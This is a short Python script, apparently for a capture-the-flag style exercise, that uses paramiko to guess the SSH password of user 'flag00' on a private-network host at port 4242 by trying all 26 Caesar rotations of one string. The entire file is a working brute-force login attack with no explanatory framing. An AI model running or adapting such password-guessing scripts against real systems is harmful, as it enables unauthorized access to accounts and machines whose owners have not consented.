import paramiko
import time

passwords = [
    "cdiiddwpgswtgt",      # ROT-0
    "dejjeexqhtxuhu",      # ROT-1
    "efkkffyriuyviv",      # ROT-2
    "fgllggzsjvzwjw",      # ROT-3
    "ghmmhhatkwaxkx",      # ROT-4
    "hinniibulxbyly",      # ROT-5
    "ijoojjcvmyczmz",      # ROT-6
    "jkppkkdwnzdana",      # ROT-7
    "klqqllexoaebob",      # ROT-8
    "lmrrmmfypbfcpc",      # ROT-9
    "mnssnngzqcgdqd",      # ROT-10
    "nottoohardhere",      # ROT-11
    "opuuppibseifsf",      # ROT-12
    "pqvvqqjctfjgtg",      # ROT-13
    "qrwwrrkdugkhuh",      # ROT-14
    "rsxxsslevhlivi",      # ROT-15
    "styyttmfwimjwj",      # ROT-16
    "tuzzuungxjnkxk",      # ROT-17
    "uvaavvohykolyl",      # ROT-18
    "vwbbwwpizlpmzm",      # ROT-19
    "wxccxxqjamqnan",      # ROT-20
    "xyddyyrkbnrobo",      # ROT-21
    "yzeezzslcospcp",      # ROT-22
    "zaffaatmdptqdq",      # ROT-23
    "abggbbunequrer",      # ROT-24
    "bchhccvofrvsfs"       # ROT-25
]

# SSH connection details
hostname = "10.14.58.177"
port = 4242
username = "flag00"

def try_ssh_login(password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, port=port, username=username, password=password, timeout=5)
        print(f"[+] Success: Password '{password}' worked for {username}@{hostname}:{port}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed: Password '{password}' incorrect")
        return False
    except Exception as e:
        print(f"[!] Error with password '{password}': {e}")
        return False
    finally:
        client.close()

def main():
    print(f"Testing passwords for {username}@{hostname}:{port}")
    for password in passwords:
        if try_ssh_login(password):
            break  # Stop on success
        time.sleep(1) 
        print("Testin...") # Avoid overwhelming the server

if __name__ == "__main__":
    main()